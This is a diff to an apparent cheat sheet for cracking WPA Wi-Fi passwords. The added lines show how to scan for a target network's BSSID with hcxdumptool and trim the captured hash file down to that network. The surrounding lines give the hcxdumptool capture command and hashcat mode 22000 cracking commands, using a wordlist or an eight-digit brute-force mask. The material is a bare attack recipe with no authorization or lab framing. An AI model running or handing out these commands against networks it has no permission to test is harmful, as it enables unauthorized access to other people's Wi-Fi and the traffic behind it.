@@ -18,6 +18,16 @@ hcxdumptool -i wlan0 -o filename.pcapng --active_beacon --enable_status=1
 hashcat -m 22000 hash.hc22000 wordlist.txt
 
 
+-------------#  If you want to crack specific wifi network     
+ // You can use this to find wifi bssid ( EX: 0cf7c0c43943
+sudo hcxdumptool --do_rcascan -i wlan0          
+
+// You need to delete other wifi network. # You can use bssid to find target wifi
+nano hash.hc
+-------------#
+
+
+
 ------  Windows  -------
 
 hashcat.exe -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
